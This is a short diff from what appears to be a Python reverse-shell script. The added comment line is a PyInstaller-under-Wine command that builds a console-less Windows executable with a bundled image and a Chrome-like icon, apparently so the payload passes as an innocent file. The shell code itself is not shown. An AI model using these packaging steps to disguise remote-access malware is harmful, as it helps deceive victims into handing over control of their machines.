@@ -137,6 +137,7 @@ connection()
 ## Command used to genertae exe
 ##wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile reverseShell.py 
 ##wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon /root/downloads/balcchrome.ico reverseShell.py 
+##Wine /root/.wine/drive_c/Python27/Scripts/Pyinstaller.exe --add-data "/root/downloads/Dragon/jpg;." --onefile --noconsole --icon /root/downloads/balcchrome.ico reverseShell.py 
 sock.close()
 
 
